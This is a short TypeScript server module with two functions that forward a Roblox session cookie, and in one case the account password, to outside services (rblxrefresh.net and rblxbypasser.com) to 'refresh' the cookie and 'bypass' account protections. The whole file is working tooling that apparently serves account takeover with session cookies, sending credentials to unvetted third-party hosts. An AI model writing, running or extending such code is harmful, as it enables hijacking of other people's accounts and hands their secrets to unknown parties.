import { createServerFn } from "@tanstack/react-start";

export const refreshCookie = createServerFn({ method: "POST" })
  .inputValidator((d: { cookie: string }) => d)
  .handler(async ({ data }) => {
    const res = await fetch("https://www.rblxrefresh.net/refreshv1", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0",
        Referer: "https://www.rblxrefresh.net/",
        Origin: "https://www.rblxrefresh.net",
      },
      body: `cookie=${encodeURIComponent(data.cookie)}`,
    });
    const text = await res.text();
    return { ok: res.ok, result: text };
  });

export const bypassAccount = createServerFn({ method: "POST" })
  .inputValidator((d: { cookie: string; password: string }) => d)
  .handler(async ({ data }) => {
    const res = await fetch("https://rblxbypasser.com/api/bypass", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0",
        Referer: "https://rblxbypasser.com/",
        Origin: "https://rblxbypasser.com",
      },
      body: JSON.stringify({
        cookie: data.cookie,
        directoryPath: "",
        version: "v2",
        password: data.password,
      }),
    });
    const txt = await res.text();
    let json: any;
    try {
      json = JSON.parse(txt);
    } catch {
      json = { message: txt };
    }
    return { ok: res.ok, status: res.status, data: json };
  });
